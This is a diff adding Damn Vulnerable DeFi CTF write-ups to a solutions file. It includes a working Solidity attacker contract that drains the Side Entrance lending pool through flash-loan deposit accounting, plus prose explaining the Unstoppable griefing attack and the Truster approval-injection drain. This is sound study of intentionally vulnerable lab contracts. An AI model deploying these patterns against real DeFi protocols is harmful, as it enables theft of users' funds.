@@ -134,6 +134,50 @@ By calling selfDestuct(), we make the Force contract to update its balance even 
 
 The lockdown only applies to transfer() and not to the transferFrom() function of the ERC20 standard. We can approve ourselves and use transferFrom() to move the tokens
 
+## Damn vulnerable Defi
+
+### Side Entrance
+
+We deploy the following attacker contract and we call the attack function. 
+
+```
+pragma solidity 0.8.16;
+
+import "./SideEntranceLenderPool.sol";
+contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {
+    address private attacker;
+    constructor() payable {
+        attacker = msg.sender;
+    }
+
+    function flashLoanLendingPool(address target) external {
+        SideEntranceLenderPool(target).flashLoan(1_000 ether);
+    }
+
+    function withdrawLendingPool(address target) external {
+        SideEntranceLenderPool(target).withdraw();
+    }
+
+    function execute() external payable {
+        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
+    }
+
+    receive() external payable {
+        payable(attacker).call{value: address(this).balance}("");
+    }
+}
+```
+
+By calling the flashLoanLendingPool() we exploit a re entrance opportunity as we deposit on the execute() call the same amount for the pool to register that we have that amount to withdraw.
+
+### Unstoppable
+
+The executeFlashLoan() function has an error as it wont allow a flash loan to be done if the pool has all the token supply. As we start with the 10, we can trasnfer them to the contract and prevent any other flash loan to occur
+
+### Truster
+
+We encode the data of an approval call giving to the player's address access to TOKENS_IN_POOL of the token. When the flash loan gets executed, a call will be done to the token's contract executing the data we encoded. After the call is done, we have an approval by the Truster's contract of TOKENS_IN_POOL amount. We later call transferFrom() to take away the tokens and transfer them to our player's address.
+
 ## Capture The Ether
 
 ### Guess the random number challenge
@@ -238,5 +282,4 @@ contract RetirementFundChallengeAttacker {
 ```
 
 Using selfDestruct, we make sure the contract receives the funds even without having a fallback or receive function
-
 
